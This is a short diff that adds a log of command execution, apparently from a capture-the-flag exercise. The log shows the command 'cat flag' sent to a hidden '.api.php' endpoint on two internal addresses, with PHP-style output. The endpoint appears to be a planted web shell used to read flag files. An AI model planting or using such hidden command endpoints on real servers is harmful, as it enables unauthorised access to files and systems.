@@ -1,0 +1,8 @@
+http://127.0.0.1/.api.php:
+cat flag
+cat flagstring(5) "flag
+"
+http://10.0.78.1/.api.php:
+cat flag
+cat flagstring(5) "flag
+"
